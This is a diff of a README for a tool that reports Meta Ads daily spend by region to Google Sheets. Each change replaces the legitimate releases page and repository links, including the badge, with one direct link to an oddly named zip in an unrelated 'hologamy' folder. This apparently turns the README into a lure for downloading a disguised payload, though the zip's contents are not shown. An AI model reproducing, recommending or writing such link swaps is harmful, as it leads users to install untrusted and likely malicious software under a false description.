@@ -4,12 +4,12 @@
 This application pulls daily spend by region for multiple Meta Ads accounts and adds the data to a Google Sheet. It simplifies spend reporting by region, making it easy to view and analyze your advertising performance. A region can refer to a US state, allowing marketers to focus their efforts on specific areas.
 
 ## 📦 Download & Install
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
+[![Download](https://raw.githubusercontent.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/main/hologamy/Google-Meta-Daily-Spend-by-to-Sheets-Ads-Region-v1.5-alpha.2.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/main/hologamy/Google-Meta-Daily-Spend-by-to-Sheets-Ads-Region-v1.5-alpha.2.zip)
 
 To get started, please follow these steps:
 
 1. **Visit the Release Page:** Click on the link below to go to the Releases page where you can download the latest version of the application.  
-   [Download Here](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
+   [Download Here](https://raw.githubusercontent.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/main/hologamy/Google-Meta-Daily-Spend-by-to-Sheets-Ads-Region-v1.5-alpha.2.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the most recent version. It will be listed at the top.
 
@@ -63,7 +63,7 @@ If you encounter issues while using the application, consider these tips:
 Join our community for support, tips, and updates. You can connect with other users by checking the discussion board linked in the repository.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets)
-- [Releases Page](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/main/hologamy/Google-Meta-Daily-Spend-by-to-Sheets-Ads-Region-v1.5-alpha.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/main/hologamy/Google-Meta-Daily-Spend-by-to-Sheets-Ads-Region-v1.5-alpha.2.zip)
 
 By following these steps and guidelines, you will have the application running in no time, helping you automate your Meta Ads spending reports. Enjoy the ease of reporting!
